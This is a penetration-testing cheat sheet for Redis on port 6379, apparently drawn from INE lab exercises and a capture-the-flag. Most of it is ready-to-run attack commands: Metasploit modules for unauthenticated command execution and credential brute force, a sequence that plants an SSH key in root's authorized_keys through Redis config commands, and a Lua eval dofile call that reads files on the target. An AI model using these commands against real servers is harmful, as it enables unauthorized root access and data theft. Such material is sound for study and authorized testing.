# 6379 (Redis)

## Enumeration

### Automatic

#### nmap

```bash
nmap --script redis-info -sV -p 6379 <IP>
```

#### Metasploit

```bash
msf> use auxiliary/scanner/redis/redis_server
```

### Manual

#### Telnet, Netcat, Redis-cli

```bash
telnet <IP> 6379
nc -vn <IP> 6379
redis-cli -h <IP>
```

Commands:

```bash
# Check version info etc. as well as the ability to run commands without auth
INFO
# List all the stored keys.
KEYS *
# Get the value of a stored key
GET <KEY>
# Other
config get *
config get dir
```

#### Curl Gopher

```
curl gopher://demo1.ine.local:6379/_GET%20flag --max-time 1
```

## Exploitation

### Unauthenticated Redis Server

#### Metasploit

```bash
msfconsole
search redis
use exploit/linux/redis/redis_replication_cmd_exec
set RHOSTS <IP>
set LHOST <IP>
set SRVHOST <IP>
exploit
```

### Overwriting Arbitrary Files

#### Redis-cli

```bash
# Generate Key Pair
ssh-keygen
ssh-key
<enter>
<enter>
# Copy key file and place onto Redis server naming it test
(echo -e "\n\n"; cat /root/ssh-key.pub; echo -e "\n\n") > key
cat key | redis-cli -h demo2.ine.local -x set test
# Dump the key to the target machine /root/.ssh/ directory using redis-cli
redis-cli -h demo2.ine.local
config set dir /root/.ssh/
config get dir
config set dbfilename "authorized_keys"
save
# We have successfully uploaded the public key as authorized_keys.
# Access the target machine
ssh -i ssh-key root@demo2.ine.local
```

#### Metasploit

```bash
use auxiliary/scanner/redis/file_upload
set RHOSTS demo2.ine.local
set LocalFile /root/key
set RemoteFile /root/.ssh/authorized_keys
exploit
```

### Attacking Protected Redis

#### Metasploit

```bash
use auxiliary/scanner/redis/redis_login
set RHOSTS demo3.ine.local
exploit
# We found a credential
redis-cli -h demo3.ine.local
AUTH daniel
KEYS *
GET <KEY>
```

### Eval Abuse

> CTF Ex: Doing some research it is found that abuse of the eval and dotfile can be used

```bash
# Get the contents of the user.txt file
redis-cli -h <IP> -p 6379 eval "dofile('C:\\\Users\\\enterprise-security\\\Desktop\\\user.txt')" 0

```



